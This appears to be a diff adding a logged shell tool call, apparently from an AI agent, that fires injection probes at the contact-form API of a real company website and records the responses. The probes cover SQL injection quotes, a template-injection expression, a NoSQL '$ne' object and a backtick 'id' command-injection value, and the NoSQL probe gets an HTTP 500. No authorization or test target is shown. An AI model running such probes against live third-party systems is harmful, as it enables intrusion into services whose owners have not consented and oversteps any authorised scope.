@@ -1,0 +1,30 @@
+# command: cd /work; UA="Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+send() { code=$(curl -s -o /tmp/r.txt -w "%{http_code}" -X POST "https://www.infinitycapital.bh/api/send" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: $UA" -H "Accept: */*" -H "Accept-Encoding: identity" -H "Referer: https://www.infinitycapital.bh/contact" --data "$1"); echo "HTTP=$code sz=$(stat -c%s /tmp/r.txt) | $(head -c 200 /tmp/r.txt)"; }
+B="fname=A&lname=B&areacode=388&tel=1&cname=c&subject=s&msg=m&check=1&targets=zz"
+echo "--- baseline ---"; send "$B"
+echo "--- SQLi quote in fname ---"; send "fname=MARK1'&lname=B&areacode=388&tel=1&cname=c&subject=s&msg=m&check=1&targets=zz"
+echo "--- SQLi quote in msg ---"; send "fname=A&lname=B&areacode=388&tel=1&cname=c&subject=s&msg=m'MARK1&check=1&targets=zz"
+echo "--- SQLi quote in areacode ---"; send "fname=A&lname=B&areacode=388'MARK1&tel=1&cname=c&subject=s&msg=m&check=1&targets=zz"
+echo "--- SSTI \${7*7} in msg ---"; send 'fname=A&lname=B&areacode=388&tel=1&cname=c&subject=s&msg=SSRIMARK${7*7}&check=1&targets=zz'
+echo "--- NoSQL ne in msg (json ct) ---"
+curl -s -o /tmp/n.txt -w "HTTP=%{http_code} " -X POST "https://www.infinitycapital.bh/api/send" -H "Content-Type: application/json" -H "User-Agent: $UA" -H "Accept: */*" --data '{"fname":"A","lname":"B","areacode":"388","tel":"1","cname":"c","subject":"s","msg":{"$ne":"NOPMARK"},"check":"1","targets":"zz"}'; head -c 200 /tmp/n.txt; echo
+echo "--- CMDi backtick/; in areacode ---"; send 'fname=A&lname=B&areacode=388%60id%60&tel=1&cname=c&subject=s&msg=m&check=1&targets=zz'
+# tool: send
+# exit_code: 0
+# ts: 2026-09-30T11:31:50.757904+00:00
+# ---
+
+--- baseline ---
+HTTP=200 sz=194 | {"data":null,"error":{"message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format.","name":"validation_error","statusCode":422}}
+--- SQLi quote in fname ---
+HTTP=200 sz=194 | {"data":null,"error":{"statusCode":422,"name":"validation_error","message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format."}}
+--- SQLi quote in msg ---
+HTTP=200 sz=194 | {"data":null,"error":{"statusCode":422,"name":"validation_error","message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format."}}
+--- SQLi quote in areacode ---
+HTTP=200 sz=194 | {"data":null,"error":{"statusCode":422,"name":"validation_error","message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format."}}
+--- SSTI ${7*7} in msg ---
+HTTP=200 sz=194 | {"data":null,"error":{"message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format.","name":"validation_error","statusCode":422}}
+--- NoSQL ne in msg (json ct) ---
+HTTP=500 
+--- CMDi backtick/; in areacode ---
+HTTP=200 sz=194 | {"data":null,"error":{"message":"Invalid `to` field. The email address needs to follow the `email@example.com` or `Name <email@example.com>` format.","name":"validation_error","statusCode":422}}
